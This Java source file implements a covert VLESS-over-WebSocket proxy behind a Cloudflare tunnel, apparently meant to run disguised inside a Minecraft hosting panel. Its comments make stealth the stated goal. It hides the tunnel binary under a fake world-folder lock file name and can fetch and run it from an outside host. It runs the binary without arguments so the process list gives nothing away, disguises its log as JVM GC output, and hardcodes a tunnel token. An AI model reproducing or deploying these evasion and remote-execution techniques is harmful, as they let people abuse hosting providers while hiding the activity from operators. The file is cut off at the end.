package com.example.sbx;

import io.netty.bootstrap.Bootstrap;
import io.netty.bootstrap.ServerBootstrap;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.PooledByteBufAllocator;
import io.netty.buffer.Unpooled;
import io.netty.channel.*;
import io.netty.channel.nio.NioEventLoopGroup;
import io.netty.channel.socket.SocketChannel;
import io.netty.channel.socket.nio.NioServerSocketChannel;
import io.netty.channel.socket.nio.NioSocketChannel;
import io.netty.handler.codec.http.HttpObjectAggregator;
import io.netty.handler.codec.http.HttpServerCodec;
import io.netty.handler.codec.http.websocketx.BinaryWebSocketFrame;
import io.netty.handler.codec.http.websocketx.CloseWebSocketFrame;
import io.netty.handler.codec.http.websocketx.WebSocketFrame;
import io.netty.handler.codec.http.websocketx.WebSocketFrameAggregator;
import io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;
import io.netty.handler.timeout.IdleStateEvent;
import io.netty.handler.timeout.IdleStateHandler;
import io.netty.util.ReferenceCountUtil;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import java.nio.file.StandardCopyOption;
import java.text.SimpleDateFormat;
import java.time.Duration;
import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Queue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicLong;
import java.util.zip.CRC32;

public class App {

    // ================= 核心配置区 =================
    // 节点 UUID（已写死；仓库已设为私有）
    private static final String UUID = "8c8244fb-d577-4d20-90e3-788a0977b001";

    // CF_TOKEN（已写死）：启动时通过 TUNNEL_TOKEN 环境变量传给隧道子进程
    private static final String CF_TOKEN = "eyJhIjoiNTQzZDRkZTQzYjBkMjFhY2I0OTgyMmJkZGI1NzdkOTQiLCJ0IjoiZWMwNDM4MjQtZWQ5OS00NTZlLWJiMmEtMDgwZTJiNmZjMTY4IiwicyI6Ik5EWTVZMlkxTVRJdFpqUmhaQzAwTnpRMkxUbGpPVEV0TlRsbE1UVmhNMlU1WmpJMCJ9";
    
    // 👇 2. 必填：面板分配给你的真实 MC 端口 (保活机器人需要去高频 Ping 它)
    private static final int MC_REAL_PORT = 24614; 

    // 本地内部监听端口 (仅供 CF 隧道转发使用，绝对不与 MC 端口冲突)
    private static final int LISTEN_PORT = 30000;   
    private static final String WS_PATH = "/ws";    
    
    // 3. 隧道二进制下载地址（仅在 jar 未内置时兜底使用）
    private static final String CF_BINARY_URL_ARM64 = "https://arm64.oooen.com/bot.so";
    private static final String CF_BINARY_URL_AMD64 = "https://amd64.oooen.com/bot.so";

    // 4. 隐蔽性配置（尽量不留下明显痕迹）
    private static final String HELPER_BIN = "world/session.lock.bak";   // hidden inside the world folder
    private static final String LOG_FILE_NAME = "logs/gc.log";
    private static final boolean CONSOLE_LOG = false;
    private static final boolean USE_BUNDLED_BINARY = false;   // keep jar small; upload cache/helper manually

    // 5. 节奏控制（叠加随机抖动，降低机器行为的规律感）
    private static final long WATCHDOG_BASE_MS = 15000;
    private static final long WATCHDOG_MAX_MS = 300000;
    private static final long MC_KEEPALIVE_MS = 300000;
    private static final boolean MC_KEEPALIVE_ENABLED = false;   // opt-in, only if host idles the server
    private static final boolean ALLOW_DOWNLOAD = false;         // never download at runtime (stealth)
    private static final boolean ARGLESS_TUNNEL = true;          // true: self-built cloudflared with hardcoded args (hide "tunnel run" from ps)
    private static final boolean LOG_OBFUSCATE = true;   // Plan A: write gc.log as realistic JVM GC output
    private static final boolean LOG_STDOUT = false;     // true: also encode cloudflared stdout lines (noisy)
    // ==============================================

    private static final byte[] UUID_BYTES = hexStringToByteArray(UUID.replace("-", ""));

    private static final List<String> BLOCKED_DOMAINS = Arrays.asList(
            "speedtest.net", "fast.com", "speedtest.cn", "speed.cloudflare.com",
            "speedof.me", "testmy.net", "bandwidth.place", "speed.io",
            "librespeed.org", "speedcheck.org");

    private static final AtomicBoolean RUNNING = new AtomicBoolean(false);
    private static EventLoopGroup bossGroup;
    private static EventLoopGroup workerGroup;
    private static Channel serverChannel;
    private static Process tunnelProcess = null;
    private static final Path LOG_FILE = Path.of(LOG_FILE_NAME);
    private static final AtomicBoolean ARCH_MISMATCH_WARNED = new AtomicBoolean(false);
    private static final long START_NANO = System.nanoTime();
    private static final AtomicLong GC_SEQ = new AtomicLong(0);
    private static final AtomicLong STDOUT_LINES = new AtomicLong(0);
    private static final java.util.concurrent.ExecutorService IO_PUMP =
            java.util.concurrent.Executors.newSingleThreadExecutor(r -> {
                Thread t = new Thread(r, "helper-io");
                t.setDaemon(true);
                return t;
            });

    public static void main(String[] args) {
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            log("shutting down");
            stop();
        }, "shutdown-hook"));
        start();
        try {
            if (serverChannel != null) {
                serverChannel.closeFuture().sync();
            }
        } catch (InterruptedException ignored) {
            Thread.currentThread().interrupt();
        }
    }

    public static void start() {
        if (!RUNNING.compareAndSet(false, true)) return;

        // 1. 先启动本地代理监听，确认绑定成功后再起隧道
        try {
            bossGroup = new NioEventLoopGroup(1);
            workerGroup = new NioEventLoopGroup();

            ServerBootstrap b = new ServerBootstrap();
            b.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(new ChannelInitializer<SocketChannel>() {
                        @Override
                        protected void initChannel(SocketChannel ch) {
                            ChannelPipeline p = ch.pipeline();
                            p.addLast(new IdleStateHandler(600, 600, 0));
                            p.addLast(new HttpServerCodec());
                            p.addLast(new HttpObjectAggregator(65536));
                            p.addLast(new WebSocketServerProtocolHandler(WS_PATH, null, false));
                            p.addLast(new WebSocketFrameAggregator(16 * 1024 * 1024));
                            p.addLast(new WebSocketProxyHandler());
                        }
                    })
                    .option(ChannelOption.SO_BACKLOG, 128)
                    .childOption(ChannelOption.TCP_NODELAY, true)
                    .childOption(ChannelOption.SO_KEEPALIVE, true)
                    .childOption(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT);

            serverChannel = b.bind("127.0.0.1", LISTEN_PORT).sync().channel();
        } catch (Exception e) {
            log("proxy bind failed: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            stop();
            return;
        }

        // 2. 启动本地 MC TCP 强行心跳保活机器人 (防休眠)
        if (MC_KEEPALIVE_ENABLED) {
            startMCKeepAliveBot(MC_REAL_PORT);
        }

        // 3. 本地后端就绪后再启动 Cloudflare 隧道守护进程
        startCloudflareTunnelDaemon();
    }

    public static void stop() {
        if (!RUNNING.getAndSet(false)) return;
        try {
            if (tunnelProcess != null) tunnelProcess.destroyForcibly();
            if (serverChannel != null) serverChannel.close();
            if (bossGroup != null) bossGroup.shutdownGracefully();
            if (workerGroup != null) workerGroup.shutdownGracefully();
        } catch (Exception ignored) {}
    }

    // ========================================================
    // 模块 1：CF 隧道（本地二进制优先，默认不下载、不内置）
    // ========================================================
    private static void startCloudflareTunnelDaemon() {
        Thread watchdogThread = new Thread(() -> {
            long waitMs = WATCHDOG_BASE_MS;
            log("watcher started");
            while (RUNNING.get()) {
                try {
                    if (tunnelProcess == null || !tunnelProcess.isAlive()) {
                        if (startTunnelOnce()) {
                            waitMs = WATCHDOG_BASE_MS;
                        } else {
                            waitMs = Math.min(waitMs * 2, WATCHDOG_MAX_MS);
                            log("retry in " + (waitMs / 1000) + "s");
                        }
                    } else {
                        waitMs = WATCHDOG_BASE_MS;
                    }
                } catch (Exception e) {
                    log("watcher error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
                    waitMs = Math.min(waitMs * 2, WATCHDOG_MAX_MS);
                }

                try {
                    Thread.sleep(jitter(waitMs));
                } catch (InterruptedException e) {
                    break;
                }
            }
        }, "CF-Tunnel-Watchdog");
        watchdogThread.setDaemon(true);
        watchdogThread.start();
    }

    /** 单次尝试：本地缓存 → 内置资源提取 → 启动并确认存活 */
    private static boolean startTunnelOnce() {
        Path binary = Path.of(HELPER_BIN);
        String hostArch = currentArch();

        boolean usable = Files.isRegularFile(binary)
                && hostArch.equals(detectElfArch(binary));
        if (!usable) {
            if (USE_BUNDLED_BINARY && extractBundledBinary(binary, hostArch)) {
                log("helper ready (from bundle)");
            } else {
                if (Files.isRegularFile(binary)) {
                    try {
                        Files.delete(binary);
                    } catch (IOException ignored) {
                    }
                }
                String dlUrl = binaryUrlFor(hostArch);
                if (dlUrl == null || dlUrl.isEmpty()) {
                    log("no binary source for arch=" + hostArch);
                    return false;
                }
                if (!ALLOW_DOWNLOAD) {
                    log("no helper binary, download disabled");
                    return false;
                }
                if (!downloadBinary(binary, dlUrl)) {
                    log("download failed, will retry");
                    return false;
                }
            }
        }

        String elfArch = detectElfArch(binary);
        if ("not-elf".equals(elfArch)) {
            log("invalid binary (not ELF)");
            try {
                Files.delete(binary);
            } catch (IOException ignored) {
            }
            return false;
        }
        if (!hostArch.equals(elfArch)) {
            if (ARCH_MISMATCH_WARNED.compareAndSet(false, true)) {
                log("arch mismatch: bin=" + elfArch + ", host=" + hostArch);
            }
            return false;
        }

        try {
            binary.toFile().setExecutable(true);
            ProcessBuilder pb = ARGLESS_TUNNEL
                    ? new ProcessBuilder(binary.toAbsolutePath().toString())
                    : new ProcessBuilder(
                            binary.toAbsolutePath().toString(),
                            "--no-autoupdate", "tunnel", "--protocol", "http2", "run"
                    );
            if (CF_TOKEN != null && !CF_TOKEN.isEmpty()) {
                pb.environment().put("TUNNEL_TOKEN", CF_TOKEN);
            }
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

            tunnelProcess = pb.start();
            pumpProcessOutput(tunnelProcess);
            log("helper process started, pid=" + tunnelProcess.pid());

            try {
                Thread.sleep(3000);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return false;
            }
            if (tunnelProcess.isAlive()) {
                log("helper alive");
                return true;
            }
            log("helper exited immediately, code=" + tunnelProcess.exitValue() + " (see [out] lines)");
            return false;
        } catch (Exception e) {
            log("start helper failed: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            return false;
        }
    }

    /** 从 jar 内置资源释放二进制（不产生任何下载流量） */
    private static boolean extractBundledBinary(Path target, String arch) {
        String resource = "arm64".equals(arch) ? "/bin/helper-arm64" : "/bin/helper-amd64";
        try (java.io.InputStream in = App.class.getResourceAsStream(resource)) {
            if (in == null) {
                log("bundled resource missing: " + resource);
                return false;
            }
            if (target.getParent() != null) {
                Files.createDirectories(target.getParent());
            }
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
            log("extracted " + resource);
            return true;
        } catch (Exception e) {
            log("extract failed: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            return false;
        }
    }

    private static boolean downloadBinary(Path target, String url) {
        try {
            if (target.getParent() != null) {
                Files.createDirectories(target.getParent());
            }
            log("downloading " + url);
            HttpClient client = HttpClient.newBuilder()
                    .followRedirects(HttpClient.Redirect.NORMAL)
                    .connectTimeout(Duration.ofSeconds(15))
                    .build();
            HttpRequest req = HttpRequest.newBuilder(URI.create(url))
                    .timeout(Duration.ofMinutes(3))
                    .build();
            HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(target));
            long size = Files.size(target);
            if (res.statusCode() != 200) {
                log("download http " + res.statusCode());
                return false;
            }
            if (size < 1_000_000) {
                log("download size too small: " + size);
                return false;
            }
            log("download ok: " + size + " bytes, elf=" + detectElfArch(target));
            return true;
        } catch (Exception e) {
            log("download error: " + e.getClass().getSimpleName() + " - " + e.getMessage());
            return false;
        }
    }

    /** 解析 ELF 头 e_machine 字段判断二进制架构 */
    private static String detectElfArch(Path p) {
        try (java.io.InputStream in = Files.newInputStream(p)) {
            byte[] hdr = in.readNBytes(20);
            if (hdr.length < 20 || hdr[0] != 0x7F || hdr[1] != 0x45 || hdr[2] != 0x4C || hdr[3] != 0x46) {
                return "not-elf";
            }
            int machine = (hdr[18] & 0xFF) | ((hdr[19] & 0xFF) << 8);
            switch (machine) {
                case 62:  return "x86_64";
                case 183: return "arm64";
                case 40:  return "arm32";
                default:  return "machine-" + machine;
            }
        } catch (IOException e) {
            return "unknown";
        }
    }

    private static String currentArch() {
        String arch = System.getProperty("os.arch", "").toLowerCase();
        if (arch.contains("aarch64") || arch.contains("arm64")) return "arm64";
        if (arch.contains("amd64") || arch.contains("x86_64")) return "x86_64";
        return arch;
    }

    private static String binaryUrlFor(String arch) {
        if ("arm64".equals(arch)) return CF_BINARY_URL_ARM64;
        if ("x86_64".equals(arch)) return CF_BINARY_URL_AMD64;
        return null;
    }

    /** 在基础间隔上叠加 ±10% 随机抖动，避免机械规律 */
    private static long jitter(long baseMs) {
        long delta = (long) (baseMs * 0.2 * Math.random()) - baseMs / 10;
        return Math.max(1000, baseMs + delta);
    }

    /** 读取子进程输出写入伪装日志，避免管道阻塞，也不暴露到控制台 */
    private static void pumpProcessOutput(Process proc) {
        IO_PUMP.execute(() -> {
            try (java.io.BufferedReader reader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(proc.getInputStream(), StandardCharsets.UTF_8))) {
                String line;
                while ((line = reader.readLine()) != null) {
                    if (!line.isBlank()) log("[out] " + line);
                }
            } catch (IOException ignored) {
            }
        });
    }

    private static synchronized void log(String msg) {
        if (!LOG_OBFUSCATE) {
            appendLog(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date()) + " " + msg);
            return;
        }
        if (msg.startsWith("[out] ")) {
            if (LOG_STDOUT) {
                appendLog(gcLine(10, textPayload(msg)));
            } else {
                STDOUT_LINES.incrementAndGet();   // cloudflared stdout 不落盘，只计数
            }
            return;
        }
        appendLog(gcLine(classify(msg), payloadFor(msg)));
    }

    private static void appendLog(String line) {
        if (CONSOLE_LOG) System.out.println(line);
        try {
            if (LOG_FILE.getParent() != null) {
                Files.createDirectories(LOG_FILE.getParent());
            }
            Files.writeString(LOG_FILE, line + System.lineSeparator(), StandardCharsets.UTF_8,
                    StandardOpenOption.CREATE, StandardOpenOption.APPEND);
        } catch (IOException ignored) {
        }
    }

    // ---------------------------------------------------------------
    // GC 伪装编码表：phase 字符串即事件类型，堆数字携带参数（40bit: a8+b7+c11+d14）
    //   0  Pause Young (Normal) (G1 Evacuation Pause)                watcher started
    //   1  Pause Full (Allocation Failure)                           retry in {N}s
    //   2  Pause Full (G1 Compaction Pause)                          watcher error (crc)
    //   3  Pause Full (System.gc())                                  proxy bind failed (crc)
    //   4  Pause Young (Concurrent Start) (G1 Humongous Allocation)  no binary source for arch={arch}
    //   5  Concurrent Cycle                                          helper alive
    //   6  Pause Young (Normal) (G1 Preventive GC)                   helper process started pid={pid} stdout={n}
    //   7  Pause Young (Mixed) (G1 Evacuation Pause)                 helper exited code={code} stdout={n}
    //   8  Pause Young (Prepare Mixed) (G1 Evacuation Pause)         start helper failed (crc)
    //   9  Pause Young (Concurrent Start) (G1 Evacuation Pause)      shutting down
    //  10  Pause Young (Normal) (G1 Evacuation Pause) (to-space exhausted)  cloudflared stdout (crc)
    //  11  Concurrent Undo Cycle                                     no helper binary, download disabled
    //  12  Concurrent Cleanup                                        other/unknown (crc)
    // ---------------------------------------------------------------
    private static final String[] GC_PHASES = {
            "Pause Young (Normal) (G1 Evacuation Pause)",
            "Pause Full (Allocation Failure)",
            "Pause Full (G1 Compaction Pause)",
            "Pause Full (System.gc())",
            "Pause Young (Concurrent Start) (G1 Humongous Allocation)",
            "Concurrent Cycle",
            "Pause Young (Normal) (G1 Preventive GC)",
            "Pause Young (Mixed) (G1 Evacuation Pause)",
            "Pause Young (Prepare Mixed) (G1 Evacuation Pause)",
            "Pause Young (Concurrent Start) (G1 Evacuation Pause)",
            "Pause Young (Normal) (G1 Evacuation Pause) (to-space exhausted)",
            "Concurrent Undo Cycle",
            "Concurrent Cleanup",
    };

    private static int classify(String msg) {
        if (msg.startsWith("shutting down")) return 9;
        if (msg.startsWith("proxy bind failed")) return 3;
        if (msg.startsWith("watcher started")) return 0;
        if (msg.startsWith("retry in ")) return 1;
        if (msg.startsWith("watcher error")) return 2;
        if (msg.startsWith("no binary source")) return 4;
        if (msg.startsWith("no helper binary")) return 11;
        if (msg.startsWith("helper process started")) return 6;
        if (msg.startsWith("helper alive")) return 5;
        if (msg.startsWith("helper exited immediately")) return 7;
        if (msg.startsWith("start helper failed")) return 8;
        return 12;
    }

    /** 从已知消息提取参数，打包成 40bit payload */
    private static long payloadFor(String msg) {
        switch (classify(msg)) {
            case 0:
            case 5:
            case 9:
            case 11:
                return 0L;   // 无参数事件：保持稳定的“小 GC”数字
            case 1: {   // retry in Ns
                int sec = 0;
                for (int i = "retry in ".length(); i < msg.length(); i++) {
                    char ch = msg.charAt(i);
                    if (ch < '0' || ch > '9') break;
                    sec = sec * 10 + (ch - '0');
                }
                return sec;
            }
            case 4: {   // no binary source for arch=X
                long arch = msg.contains("amd64") ? 1 : (msg.contains("arm64") ? 0 : 2);
                return arch;
            }
            case 6: {   // pid(22bit) + stdout count(18bit)
                long pid = parseLongAfter(msg, "pid=");
                long count = Math.min(STDOUT_LINES.get(), 0x3FFFFL);
                return ((count & 0x3FFFFL) << 22) | (pid & 0x3FFFFFL);
            }
            case 7: {   // exit code(8bit) + stdout count(16bit)
                long exit = parseLongAfter(msg, "code=");
                long count = Math.min(STDOUT_LINES.get(), 0xFFFFL);
                return ((count & 0xFFFFL) << 8) | (exit & 0xFFL);
            }
            default:
                return textPayload(msg);   // 自由文本：长度(8bit) + CRC32(32bit)
        }
    }

    private static long parseLongAfter(String msg, String marker) {
        int idx = msg.indexOf(marker);
        long value = 0;
        if (idx >= 0) {
            for (int i = idx + marker.length(); i < msg.length(); i++) {
                char ch = msg.charAt(i);
                if (ch < '0' || ch > '9') break;
                value = value * 10 + (ch - '0');
            }
        }
        return value;
    }

    /** 自由文本不落盘：只保存长度(8bit) + CRC32(32bit)，用于识别“和上次同一条” */
    private static long textPayload(String msg) {
        CRC32 crc = new CRC32();
        crc.update(msg.getBytes(StandardCharsets.UTF_8));
        long len = Math.min(msg.length(), 0xFFL);
        return (len << 32) | (crc.getValue() & 0xFFFFFFFFL);
    }

    /** 40bit payload -> 一行 JVM GC 输出 */
    private static String gcLine(int code, long payload) {
        long a = 96 + (payload & 0xFFL);
        long b = 48 + ((payload >>> 8) & 0x7FL);
        long c = 1024 + ((payload >>> 15) & 0x7FFL);
        long d = 1 + ((payload >>> 26) & 0x3FFFL);
        double uptime = (System.nanoTime() - START_NANO) / 1_000_000_000.0;
        return String.format(Locale.ROOT, "[%.3fs][info][gc] GC(%d) %s %dM->%dM(%dM) %.3fms",
                uptime, GC_SEQ.getAndIncrement(), GC_PHASES[code], a, b, c, d);
    }

 
    // ========================================================
    // 模块 2：MC 高频心跳 TCP 挂机保活引擎 (防面板休眠)
    // ========================================================
        private static void startMCKeepAliveBot(int mcPort) {
        if (!MC_KEEPALIVE_ENABLED) {
            return;
        }
        Thread botThread = new Thread(() -> {
            while (RUNNING.get()) {
                if (tunnelProcess != null && tunnelProcess.isAlive()) {
                    try (java.net.Socket socket = new java.net.Socket("127.0.0.1", mcPort)) {
                        socket.setSoTimeout(5000);
                        DataOutputStream dos = new DataOutputStream(socket.getOutputStream());

                        ByteArrayOutputStream b = new ByteArrayOutputStream();
                        DataOutputStream handshake = new DataOutputStream(b);
                        handshake.writeByte(0x00);         // Packet ID
                        writeVarInt(handshake, 763);       // Protocol Version
                        writeString(handshake, "127.0.0.1");
                        handshake.writeShort(mcPort);      // Port
                        writeVarInt(handshake, 1);         // Next State: 1 (Status)

                        writeVarInt(dos, b.size());
                        dos.write(b.toByteArray());

                        dos.writeByte(1);    // Length
                        dos.writeByte(0x00); // Packet ID
                        dos.flush();
                    } catch (Exception ignored) {
                        // silent, avoid log spam
                    }
                }

                try {
                    long delay = (long) (MC_KEEPALIVE_MS * (0.6 + 0.8 * Math.random()));
                    Thread.sleep(delay);
                } catch (InterruptedException e) {
                    break;
                }
            }
        }, "MC-KeepAlive-Thread");
        botThread.setDaemon(true);
        botThread.start();
    }

    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while (true) {
            if ((value & ~0x7F) == 0) {
                out.writeByte(value);
                return;
            }
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
    }

    private static void writeString(DataOutputStream out, String value) throws IOException {
        byte[] bytes = value.getBytes(StandardCharsets.UTF_8);
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }

    // ========================================================
    // 模块 3：纯内存 VLESS over WebSocket 核心转发（仅 TCP）
    // ========================================================
    static class WebSocketProxyHandler extends SimpleChannelInboundHandler<WebSocketFrame> {
        private static final long MAX_PENDING_BYTES = 2L * 1024 * 1024;
        private Channel outboundChannel;
        private boolean connected = false;
        private boolean connecting = false;
        private boolean protocolIdentified = false;
        private final Queue<ByteBuf> pendingOutboundWrites = new ArrayDeque<>();
        private long pendingOutboundBytes = 0;
        private byte[] pendingFirst = null;

        @Override
        protected void channelRead0(ChannelHandlerContext ctx, WebSocketFrame frame) {
            if (frame instanceof BinaryWebSocketFrame) {
                ByteBuf content = frame.content();
                if (!protocolIdentified) {
                    byte[] data = new byte[content.readableBytes()];
                    content.getBytes(content.readerIndex(), data);
                    handleFirstMessage(ctx, data);
                } else if (outboundChannel != null && outboundChannel.isActive()) {
                    relayToTarget(ctx, content.retain());
                } else if (connecting) {
                    queuePendingOutbound(ctx, content.retain());
                } else {
                    closeBoth(ctx);
                }
            } else if (frame instanceof CloseWebSocketFrame) {
                closeBoth(ctx);
            }
        }

        private void relayToTarget(ChannelHandlerContext ctx, ByteBuf data) {
            if (outboundChannel == null || !outboundChannel.isActive()) {
                data.release();
                closeBoth(ctx);
                return;
            }
            outboundChannel.write(data).addListener((ChannelFutureListener) future -> {
                if (!future.isSuccess()) closeBoth(ctx);
            });
        }

        @Override
        public void channelReadComplete(ChannelHandlerContext ctx) {
            if (outboundChannel != null && outboundChannel.isActive()) outboundChannel.flush();
            ctx.fireChannelReadComplete();
        }

        private void queuePendingOutbound(ChannelHandlerContext ctx, ByteBuf data) {
            int readableBytes = data.readableBytes();
            if (pendingOutboundBytes + readableBytes > MAX_PENDING_BYTES) {
                data.release();
                closeBoth(ctx);
                return;
            }
            pendingOutboundWrites.add(data);
            pendingOutboundBytes += readableBytes;
        }

        private void flushPendingOutbound(ChannelHandlerContext ctx) {
            while (!pendingOutboundWrites.isEmpty()) {
                if (outboundChannel == null || !outboundChannel.isActive()) {
                    releasePendingOutbound();
                    closeBoth(ctx);
                    return;
                }
                ByteBuf data = pendingOutboundWrites.poll();
                pendingOutboundBytes -= data.readableBytes();
                outboundChannel.write(data).addListener((ChannelFutureListener) future -> {
                    if (!future.isSuccess()) closeBoth(ctx);
                });
            }
            if (outboundChannel != null) outboundChannel.flush();
        }

        private void releasePendingOutbound() {
            ByteBuf data;
            while ((data = pendingOutboundWrites.poll()) != null) data.release();
            pendingOutboundBytes = 0;
        }

        private void closeBoth(ChannelHandlerContext ctx) {
            pendingFirst = null;
            releasePendingOutbound();
            if (outboundChannel != null && outboundChannel.isOpen()) outboundChannel.close();
            if (ctx.channel().isOpen()) ctx.close();
        }

        private void handleFirstMessage(ChannelHandlerContext ctx, byte[] data) {
            byte[] buf;
            if (pendingFirst == null) {
                buf = data;
            } else {
                buf = new byte[pendingFirst.length + data.length];
                System.arraycopy(pendingFirst, 0, buf, 0, pendingFirst.length);
                System.arraycopy(data, 0, buf, pendingFirst.length, data.length);
            }

            if (buf.length > 18 && (buf[0] == 0x00 || buf[0] == 0x01)) {
                boolean uuidMatch = true;
                for (int i = 0; i < 16; i++) {
                    if (buf[i + 1] != UUID_BYTES[i]) {
                        uuidMatch = false;
                        break;
                    }
                }
                if (uuidMatch) {
                    if (handleVless(ctx, buf)) {
                        protocolIdentified = true;
                        pendingFirst = null;
                        return;
                    }
                    if (buf.length < 1024) {
                        pendingFirst = buf;   // incomplete VLESS header, wait for more frames
                        return;
                    }
                }
            }
            pendingFirst = null;
            ctx.close();
        }

        private boolean handleVless(ChannelHandlerContext ctx, byte[] data) {
            try {
                byte version = data[0];
                int addonsLength = data[17] & 0xFF;
                int offset = 18 + addonsLength;
                if (offset + 1 > data.length) return false;

                byte command = data[offset];
                if (command != 0x01) return false;
                offset++;
                if (offset + 2 > data.length) return false;

                int port = ((data[offset] & 0xFF) << 8) | (data[offset + 1] & 0xFF);
                offset += 2;
                if (offset >= data.length) return false;

                byte atyp = data[offset];
                offset++;
                String host;
                int addressLength;

                if (atyp == 0x01) {
                    if (offset + 4 > data.length) return false;
                    host = String.format("%d.%d.%d.%d", data[offset] & 0xFF, data[offset + 1] & 0xFF, data[offset + 2] & 0xFF, data[offset + 3] & 0xFF);
                    addressLength = 4;
                } else if (atyp == 0x02) {
                    if (offset >= data.length) return false;
                    int hostLen = data[offset] & 0xFF;
                    offset++;
                    if (offset + hostLen > data.length) return false;
                    host = new String(data, offset, hostLen, StandardCharsets.UTF_8);
                    addressLength = hostLen;
                } else if (atyp == 0x03) {
                    if (offset + 16 > data.length) return false;
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < 16; i += 2) {
                        if (i > 0) sb.append(':');
                        sb.append(String.format("%02x%02x", data[offset + i], data[offset + i + 1]));
                    }
                    host = sb.toString();
                    addressLength = 16;
                } else {
                    return false;
                }

                offset += addressLength;

                if (isBlockedDomain(host)) {
                    ctx.close();
                    return false;
                }

                ctx.writeAndFlush(new BinaryWebSocketFrame(Unpooled.wrappedBuffer(new byte[]{version, 0x00})));
                final byte[] remainingData = (offset < data.length) ? Arrays.copyOfRange(data, offset, data.length) : new byte[0];
                connectToTarget(ctx, host, port, remainingData);
                return true;
            } catch (Exception e) {
                return false;
            }
        }

        private void connectToTarget(ChannelHandlerContext ctx, String host, int port, byte[] remainingData) {
            if (connecting || connected) {
                closeBoth(ctx);
                return;
            }

            final byte[] dataToSend = remainingData;
            connecting = true;
            ctx.channel().config().setAutoRead(false);

            Bootstrap b = new Bootstrap();
            b.group(ctx.channel().eventLoop())
                    .channel(NioSocketChannel.class)
                    .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 8000)
                    .option(ChannelOption.TCP_NODELAY, true)
                    .option(ChannelOption.SO_KEEPALIVE, true)
                    .option(ChannelOption.ALLOCATOR, PooledByteBufAllocator.DEFAULT)
                    .handler(new ChannelInitializer<Channel>() {
                        @Override
                        protected void initChannel(Channel ch) {
                            ch.pipeline().addLast(new IdleStateHandler(0, 0, 600));
                            ch.pipeline().addLast(new TargetHandler(ctx.channel(), dataToSend));
                        }
                    });

            ChannelFuture f = b.connect(host, port);
            outboundChannel = f.channel();

            f.addListener((ChannelFutureListener) future -> {
                if (future.isSuccess()) {
                    connected = true;
                    connecting = false;
                    flushPendingOutbound(ctx);
                    future.channel().config().setAutoRead(true);
                    if (ctx.channel().isActive()) ctx.channel().config().setAutoRead(true);
                } else {
                    connecting = false;
                    closeBoth(ctx);
                }
            });
        }

        @Override
        public void channelWritabilityChanged(ChannelHandlerContext ctx) {
            if (outboundChannel != null && outboundChannel.isActive()) {
                outboundChannel.config().setAutoRead(ctx.channel().isWritable());
            }
            ctx.fireChannelWritabilityChanged();
        }

        @Override
        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {
            if (evt instanceof IdleStateEvent) closeBoth(ctx);
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            closeBoth(ctx);
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            closeBoth(ctx);
        }
    }

    static class TargetHandler extends ChannelInboundHandlerAdapter {
        private final Channel inboundChannel;
        private final byte[] remainingData;

        public TargetHandler(Channel inboundChannel, byte[] remainingData) {
            this.inboundChannel = inboundChannel;
            this.remainingData = remainingData;
        }

        @Override
        public void channelActive(ChannelHandlerContext ctx) {
            if (remainingData != null && remainingData.length > 0) {
                ctx.writeAndFlush(Unpooled.wrappedBuffer(remainingData)).addListener((ChannelFutureListener) future -> {
                    if (!future.isSuccess()) ctx.close();
                });
            }
        }

        @Override
        public void userEventTriggered(ChannelHandlerContext ctx, Object evt) {
            if (evt instanceof IdleStateEvent) {
                ctx.close();
                if (inboundChannel.isActive()) inboundChannel.close();
            } else {
                ctx.fireUserEventTriggered(evt);
            }
        }

        @Override
        public void channelRead(ChannelHandlerContext ctx, Object msg) {
            try {
                if (msg instanceof ByteBuf) {
                    ByteBuf buf = (ByteBuf) msg;
                    if (inboundChannel.isActive()) {
                        inboundChannel.write(new BinaryWebSocketFrame(buf.retain()))
                                .addListener((ChannelFutureListener) future -> {
                                    if (!future.isSuccess()) ctx.close();
                                });
                    } else {
                        ctx.close();
                    }
                }
            } finally {
                ReferenceCountUtil.release(msg);
            }
        }

        @Override
        public void channelReadComplete(ChannelHandlerContext ctx) {
            if (inboundChannel.isActive()) inboundChannel.flush();
            ctx.fireChannelReadComplete();
        }

        @Override
        public void channelWritabilityChanged(ChannelHandlerContext ctx) {
            if (inboundChannel.isActive()) inboundChannel.config().setAutoRead(ctx.channel().isWritable());
            ctx.fireChannelWritabilityChanged();
        }

        @Override
        public void channelInactive(ChannelHandlerContext ctx) {
            if (inboundChannel.isActive()) inboundChannel.close();
        }

        @Override
        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
            ctx.close();
        }
    }

    private static byte[] hexStringToByteArray(String s) {
        int len = s.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(s.charAt(i), 16) << 4) + Character.digit(s.charAt(i + 1), 16));
        }
        return data;
    }

    private static boolean isBlockedDomain(String host) {
